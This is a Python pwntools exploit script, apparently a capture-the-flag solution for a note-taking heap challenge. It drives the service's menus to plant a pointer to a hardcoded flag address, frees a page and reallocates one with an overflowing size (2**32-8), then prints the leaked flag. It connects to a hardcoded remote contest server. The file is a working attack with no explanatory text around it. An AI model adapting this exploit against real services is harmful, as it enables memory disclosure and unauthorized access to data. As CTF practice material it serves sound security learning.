from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "104.198.95.69"
    port = 30002
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("utf-8")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("utf-8")
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b'>')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    if type(s) != bytes:
        s = str(s)
        s = s.encode("ascii")

    if new_line:
        sendline(s)
    else:
        send(s)

def add_page(note_idx, index, size, data):
    menu(1)
    rs(note_idx)
    menu(1)
    rs(index)
    rs(size)
    rs(data)
    menu(3) # back

def delete_page(note_idx, index):
    menu(1)
    rs(note_idx)
    menu(2)
    rs(index)
    menu(3) # back

def concat_note(note1, note2, note3):
    menu(2)
    rs(note1)
    rs(note2)
    rs(note3)

def print_note(note_idx):
    menu(3)
    rs(note_idx)

flag_addr = 0x404140
dummy = p64(flag_addr - 8)
add_page(0, 0, 16, dummy)
add_page(0, 1, 16, dummy)
delete_page(0, 0)
add_page(0, 0, 2 **32 - 8, dummy * 8)

#wait_for_attach()
#interactive()
print_note(0)

s = recvuntil("------------")
s = recvuntil("------------")
s = recvuntil("------------")
s = s.strip(b"\n").decode("ascii")
print(s)

